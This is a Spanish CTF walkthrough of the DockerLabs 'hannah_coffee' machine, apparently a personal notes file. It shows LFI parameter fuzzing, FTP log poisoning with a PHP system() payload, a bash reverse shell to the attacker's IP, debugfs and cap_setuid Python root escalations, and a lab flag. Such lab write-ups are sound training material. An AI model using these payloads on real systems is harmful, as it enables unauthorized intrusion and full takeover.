---
tags:
  - ctf
  - writeup
platform: DockerLabs
machine: hannah_coffee
difficulty: Easy
os: Linux
status: Completada
---

# 🏴 DockerLabs — hannah_coffee
## Resumen

Hannah's Coffee es una máquina Linux de nivel fácil que simula una aplicación web de cafetería con vulnerabilidades encadenadas. El vector de entrada comienza explotando una vulnerabilidad de Inclusión Local de Archivos (LFI) en la aplicación PHP, la cual se combina con una técnica de FTP Log Poisoning para lograr Ejecución Remota de Códigos (RCE) como www-data. Para la escalada de privilegios, se requiere el uso de comandos permitidos mediante sudo y el abuso de binarios con capabilities específicas para alcanzar el acceso total como root.

---

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p21,80 172.17.0.2
```

Aquí vemos que tiene un servidor web y un servidor FTP, viendo la descripción de la máquina, más o menos me pude intuir hacia donde iba todo.

Decidí ver la páquina, no enumeré directorios porque hubo otra cosa que me llamó la atención, y fue la URL:

`http://172.17.0.2/index.php?page=home`

Esta URL es buen indicio de un **Local File Inclusion**, decidí hacer path traversal haciendo ../../../../ o con .././.././.././ que es un pequeño bypass pero no llegaba a nada, además todas esas consultas me redirigan a home, así que decidí buscar otro parámetro.


> [!NOTE] Ojo!
> El parámetro `studio` es vulnerable a **LFI**, y utilizamos **path traversal** como técnica para alcanzar archivos fuera del directorio esperado.



---

## Enumeración

Con **ffuf** puse este comando de aquí para averiguar algun parámetro vulnerable:

```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

<img src="../images/Pasted%20image%2020260818033109.png" width="523" alt="Pasted image 20260818033109" />

Pero me daba varios falsos positivos, ya que redirigian a home y tenían todos el mismo size, así que decidí filtrar por respuestas que me dieran otro size distinto y utilicé otra wordlist con este comando:

```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=AAAA" \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-fs 963
```

Y me encontró el parámetro `studio`.
![Pasted image 20260818033314](../images/Pasted%20image%2020260818033314.png)

Con este parámetro podía leer ficheros de la máquina, como `/etc/passwd`:
![Pasted image 20260818033416](../images/Pasted%20image%2020260818033416.png)

Pero, para lograr una RCE necesitaba encontrar un fichero que yo pueda modificar algo, es ahí cuando me acordé del FTP.

Busqué el registro de acceso del FTP  y se encontraba en `/var/log/vsftpd.log` 
![Pasted image 20260818033545](../images/Pasted%20image%2020260818033545.png)

Entonces tenía un fichero donde podía modificar lo que se veía, decidí ver si interpretaba PHP y en el fichero de user puse `<?php system('whoami'); ?>` para ver si me devolvía el usuario, y sí.
![Pasted image 20260818033656](../images/Pasted%20image%2020260818033656.png)

Entonces tenemos ya una RCE, nos falta enviarnos una reverse shell


---

## Acceso inicial (Foothold)

Al principio pensé en conseguir la RCE subiendo una shell.php a mi servidor y descargandola con wget, pero esto no funcionaba, así que no me compliqué y envié el comando de la reverse shell directamente en el campo de usuario con este comando:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/12345 0>&1'"); ?>
```

Este comando envía una reverse shell a mi IP al puerto 12345, nos ponemos en escucha con netcat a ese puerto con `nc -lvnp 12345`, envíamos el payload, hacemos F5 en la página web y tenemos ya una reverse shell con el usuario www-data.

![Pasted image 20260818034023](../images/Pasted%20image%2020260818034023.png)


---

## Escalada de Privilegios

```bash
sudo -l
```

Con `sudo -l` logré ver que podía ejecutar `/sbin/debugfs -w /opt/hannah_disk.img` con el usuario `hannah`

![Pasted image 20260818034157](../images/Pasted%20image%2020260818034157.png)

Así que ejecuté este comando:

```bash
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```

Y se nos abrió debugfs, para lanzarnos una shell puse simplemente !/bin/sh y ya teniamos una shell con hannah. Decidí investigar un poco en su home y encontré una flag en `/home/hannah/user.txt` pero esto no nos va a ayudar para conseguir root.

Así que decidí usar `sudo -l`pero no me dejaba, tampoco vi una subida de privilegios con los SUID con `find / -perm -u=s -type f 2>/dev/null` así que me acordé de las capabilities y fui al directorio /opt, que era donde estaba la imagen que me permitió antes acceder a este usuario.

Y vi dos archivos, el `hannah_disk.img` y un archivo llamado priv-python, con getcap pude ver los capabilities de ese archivo con `getcap priv-python`
![Pasted image 20260818034925](../images/Pasted%20image%2020260818034925.png)

Así que en GTFObins busqué una shell para usarla con python:

> [!NOTE] ¿Por qué?
`cap_setuid` permite al proceso cambiar su UID, por lo que un intérprete de Python con esta capability puede cambiar su UID a `0` y ejecutar una shell con privilegios de root.

```python
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Pero me dió error, porque no encontraba python, así que simplemente le añadí /opt/priv-python 

```python
/opt/priv-python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Lanzándome una shell con acceso root.

---

## Flags

- user.txt: `dl{user_eedfcf739a076a72412c89a1354a4119}`
